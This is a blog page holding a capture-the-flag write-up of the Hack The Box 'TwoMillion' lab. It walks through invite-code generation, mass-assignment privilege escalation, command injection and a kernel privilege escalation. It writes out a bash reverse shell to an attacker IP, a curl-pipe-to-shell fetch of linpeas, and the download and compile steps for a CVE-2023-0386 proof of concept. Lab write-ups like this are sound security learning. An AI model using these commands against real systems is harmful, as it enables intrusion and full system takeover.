<!DOCTYPE html>
<html lang="en-us">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <title>
TwoMillion | ARTIFACTS
</title>

    <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="">

<meta name="generator" content="Hugo 0.152.2">


<link rel="canonical" href="http://localhost:1313/captures/twomillion/" >




<link href="/css/style.min.5f46e10d3d75c0ba6553d0749280b20ce50648a191585d2b90bfa5a77f1653cd.css" rel="stylesheet">




</head>

<body>

    <div class="flexWrapper">
        <header class="headerWrapper">
    <div class="header">
        <div>
            <a class="terminal" href="/">
                <span>C-1485@artifacts.io ~ $</span>
            </a>
        </div>
        <input class="side-menu" type="checkbox" id="side-menu">
        <label class="hamb" for="side-menu"><span class="hamb-line"></span></label>
        <nav class="headerLinks">
            <ul>
                
                <li>
                    <a href="http://localhost:1313/posts" title="" >
                        ~/posts</a>
                </li>
                
                <li>
                    <a href="http://localhost:1313/captures" title="" >
                        ~/captures</a>
                </li>
                
                <li>
                    <a href="http://localhost:1313/about" title="" >
                        ~/about</a>
                </li>
                
            </ul>
        </nav>
    </div>
</header>


        <div class="content">
            <main class="main">
                
<div class="postWrapper">
    <h1>TwoMillion</h1>
    

    
    
    
    

    
    
    
    
    

    
    
    
    
    

    
    
    
    

    
    
    
    

    
    
    
    

    
    
    
    

    
    <section class="postMetadata">
        <dl>
            
            
            
            
            
            
                <dt>reading time</dt>
                <dd>5 minutes</dd>
            
        </dl>
    </section>
    
    <div>
        <p>This article offers a sample of basic Markdown syntax that can be used in Hugo content files, also it shows whether basic HTML elements are decorated with CSS in a Hugo theme.</p>
<hr>
<p>Nmap scan the target for available TCP ports</p>
<p align="center">
  <img
    src="/captures/screens/TwoMillion/shot-001.png"
    alt="shot-001"
  >
</p>
<hr>
<p>To be able to view the website in browser the target IP must be resolved by creating a domain mapping in /etc/hosts</p>
<p align="center">
  <img
    src="/captures/screens/TwoMillion/shot-002.png"
    alt="shot-002"
  >
</p>
<hr>
<p>We run burpsuite and examine the available path of the target under the &rsquo;target&rsquo; tab</p>
<p>Under 
<a href="http://2million.htb/invite" target="_blank" rel="noopener">http://2million.htb/invite</a>
 it is observed that an invite code is required for Sign Up</p>
<p><img src="/captures/screens/TwoMillion/shot-003.png" alt="/invite"></p>
<p>After further examination of the website&rsquo;s source, under js/invite.min.js an eval based javascript packer obfuscation script is found in the response window of burpsuite.</p>
<p><img src="/captures/screens/TwoMillion/shot-004.png" alt="obfuscated script"></p>
<p>Utilizing 
<a href="https://tunganhken.github.io/de4js/" target="_blank" rel="noopener">https://tunganhken.github.io/de4js/</a>
 the obfuscated JavaScript was deobfuscated and beautified, revealing functions that directly invoke backend API endpoints.</p>
<p><img src="/captures/screens/TwoMillion/shot-005.png" alt="beautified script"></p>
<p>Then using curl a POST request is sent to the backend endpoint, with a ROT13 cipher &lsquo;data&rsquo; value.</p>
<p><img src="/captures/screens/TwoMillion/shot-006.png" alt="rot13 cipher"></p>
<p>
<a href="https://cryptii.com/pipes/rot13-decoder" target="_blank" rel="noopener">https://cryptii.com/pipes/rot13-decoder</a>
 is a web tool that helped with the decipher of the provided ROT13.</p>
<p>The cipher&rsquo;s output:</p>
<ul>
<li>In order to generate the invite code, make a POST request to /api/v1/invite/generate</li>
</ul>
<p>Thus, we test the newly found endpoint resulting to a base64 encoded &lsquo;code&rsquo; value.</p>
<p><img src="/captures/screens/TwoMillion/shot-007.png" alt="base64 encoded"></p>
<p>The encoded string can be decoded with 
<a href="https://www.base64decode.org/" target="_blank" rel="noopener">https://www.base64decode.org/</a>
.</p>
<p>The decoded string based on the generated base64 encoding:</p>
<ul>
<li>X43BI-41KBY-4HMSL-SYVEG</li>
</ul>
<p>Once the decoded string is filled in the empty box of /invite, we get redirected to /register for registration. Next, the appropriate details are entered in /login and access to our personal /home page is granted.</p>
<p><img src="/captures/screens/TwoMillion/shot-008.png" alt="/home"></p>
<p>After, further examination of the website, it is found that only within /home/access two endpoints share the same prefix /api/v1. It is observed by hovering over &lsquo;Connection Pack&rsquo; and &lsquo;Regenerate&rsquo; buttons.</p>
<p>Thus, a browse to 
<a href="http://2million.htb/api/v1" target="_blank" rel="noopener">http://2million.htb/api/v1</a>
 various other endpoints are displayed.</p>
<p>Note: To be able to view /api/v1 responses, the current created user must be logged in. Since the namespace requires authentication via PHPSESSID.</p>
<p><img src="/captures/screens/TwoMillion/shot-009.png" alt="shot-009"></p>
<p>Three endpoints were exposed related to admin, with each respective HTTP method:</p>
<ul>
<li>/api/v1/admin/auth</li>
<li>/api/v1/admin/vpn/generate</li>
<li>/api/v1/admin/settings/update</li>
</ul>
<p>Next, using Burpsuite we request each admin related endpoint with the appropriate HTTP method as identified in /api/v1 namespace.</p>
<p><img src="/captures/screens/TwoMillion/shot-010.png" alt="shot-010"></p>
<p>A GET request to /api/v1/admin/auth provides a json response message, indicating that the current logged in user is not an admin.</p>
<p><img src="/captures/screens/TwoMillion/shot-011.png" alt="shot-011"></p>
<p>Since, the current user is does not have administrative access, a POST request to /api/v1/admin/vpn/generate, provides a response indicating that we are unauthorized.</p>
<p><img src="/captures/screens/TwoMillion/shot-012.png" alt="shot-012"></p>
<p>Next, a PUT request to /api/v1/admin/settings/update, shows a response that could be tampered. It appears again that the content type the API accepts as request is application/json.</p>
<p><img src="/captures/screens/TwoMillion/shot-013.png" alt="shot-013"></p>
<p>On line 11 of the request the content type is specified, and some dummy key:value pair is added to test the response behavior. A message is hinted that an email parameter is missing.</p>
<!-- screenshots:anchor -->
<p>When a valid email is added to the json structure, a new message appears, specifying that is_admin also must be added to the structure.</p>
<h3 id="shot-014">shot-014</h3>
<p><img src="/captures/screens/TwoMillion/shot-014.png" alt="shot-014"></p>
<p>As properly assumed, is_admin is a boolean variable. Hence by passing a value of 1, in the response&rsquo;s json struct key is_admin is set to 1 (true).</p>
<h3 id="shot-015">shot-015</h3>
<p><img src="/captures/screens/TwoMillion/shot-015.png" alt="shot-015"></p>
<p>When a new GET request is made in /api/v1/admin/auth, the response indicates that the created user now has administrative privileges.</p>
<h3 id="shot-016">shot-016</h3>
<p><img src="/captures/screens/TwoMillion/shot-016.png" alt="shot-016"></p>
<p>The response from a reqest to /api/v1/admin/vpn/generate, contains an OpenVPN client profile generated by an administrative API endpoint. Including CA-signed client certificates and private key, potentially enabling direct VPN access to the internal network with elevated privileges.</p>
<p>Hence, the OpenVNP client generation, appeared like a system level operation. Which resulted in a command injection probe, that exposed some local directories of the target.</p>
<p><img src="/captures/screens/TwoMillion/shot-017.png" alt="shot-017"></p>
<hr>
<p>Environment variable values are key–value strings stored by the operating system and made available to running processes. Effectively, influencing application behaviors without changing code.</p>
<p>When probed the .env file of the target, various key-value pairs shown environment variables linked to the database of the application.</p>
<p><img src="/captures/screens/TwoMillion/shot-018.png" alt="shot-018"></p>
<hr>
<p>However, since execution of shell commands and bash is also available on the target, a bash reverse shell payload was injected to the json structure. Effectively allowing reverse communication to the aggressor, with system access.</p>
<p>nc -lvnp 4444 - the running listener on the aggressor.</p>
<p><img src="/captures/screens/TwoMillion/shot-019.png" alt="shot-019"></p>
<p>bash -c &lsquo;bash -i &gt;&amp; /dev/tcp/10.10.15.190/4444 0&gt;&amp;1&rsquo; - bash reverse shell command used in the burpsuite json request.</p>
<p><img src="/captures/screens/TwoMillion/shot-020.png" alt="shot-020"></p>
<p>The established reverse shell on the aggressor.</p>
<p><img src="/captures/screens/TwoMillion/shot-021.png" alt="shot-021"></p>
<hr>
<p>At this point the user we are connected as is www-data. Nevertheless, according to the credentials found in .env we switch to the admin user with su admin and enter the password SuperDuperPass123.</p>
<p>Thus, we can view the user.txt flag, located in /home/admin.</p>
<ul>
<li>e6028d512a774b66d8248d6f3e6cfe82</li>
</ul>
<hr>
<p>Linpeas Enumeration</p>
<p>A python listener is set up on the attacker machine, where linpeas.sh is located.</p>
<p>sudo python3 -m http.server 80</p>
<p>Hence, we obtain and execute linpeas.sh from the target using curl for a comprehensive system enumeration</p>
<p>curl &lt;attacker_ip&gt;/linpeas.sh | sh</p>
<p>As observed there were various findings, but what seemed of interest was an email exchange located in /var/mail. Indicating that the system is potentially vulnerable to CVE-2023-0386</p>
<p><img src="/captures/screens/TwoMillion/shot-022.png" alt="shot-022"></p>
<hr>
<p>CVE-2023-0386 Proof of Concept</p>
<p>A concise exploitation procedure is found:

<a href="https://github.com/DataDog/security-labs-pocs/blob/main/proof-of-concept-exploits/overlayfs-cve-2023-0386/poc.c" target="_blank" rel="noopener">https://github.com/DataDog/security-labs-pocs/blob/main/proof-of-concept-exploits/overlayfs-cve-2023-0386/poc.c</a>
</p>
<p>The compilation process requires libfuse for the implemention of the malicious filesystem:</p>
<ul>
<li>apt install libfuse-dev</li>
<li>gcc poc.c -o poc -D_FILE_OFFSET_BITS=64 -static -lfuse -ldl</li>
</ul>
<p>Then a local python server is set up on port 9000, for a the download of the exploit on the target machine with the use of curl.</p>
<p>curl -O http://10.10.15.190:9000/poc</p>
<p><img src="/captures/screens/TwoMillion/shot-023.png" alt="shot-023"></p>
<p>All that was required, for the privilege escalation, was to make the scrip executable with chmod +x and then run it.</p>
<p><img src="/captures/screens/TwoMillion/shot-024.png" alt="shot-024"></p>
<hr>
<p>Thus, we become root and have control over the entire system. With the flag captured with cat /root/root.txt</p>
    </div>
</div>

            </main>
        </div>


        <footer class="footer">
    
        <span>
            ♣ ♦ ♠ ♥ 
        </span>
    
</footer>
    </div>

</body>

</html>
